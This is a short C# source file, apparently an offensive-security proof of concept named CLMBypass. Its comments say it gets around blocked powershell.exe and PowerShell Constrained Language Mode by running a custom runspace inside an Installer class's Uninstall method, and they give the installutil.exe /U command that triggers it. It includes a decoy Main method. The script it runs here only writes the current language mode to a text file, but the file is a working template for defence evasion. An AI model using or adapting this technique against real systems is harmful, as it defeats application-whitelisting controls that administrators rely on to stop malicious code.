using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
// If powershell.exe is blocked, you can use installuti.exe to bypass it.
// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U Bypass.exe
namespace CLMBypass
{
	class Programa
	{
		static void Main(string[] args)
		{
			Console.WriteLine("This is the main method which is a decoy");
		}	
	}

	[System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
		public override void Uninstall(System.Collections.IDictionary savedState)
		{
			String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath test.txt";
			Runspace rs = RunspaceFactory.CreateRunspace();
			rs.Open();

			PowerShell ps = PowerShell.Create();
			ps.Runspace = rs;

			ps.AddScript(cmd);

			ps.Invoke();

			rs.Close();
		}
	}
}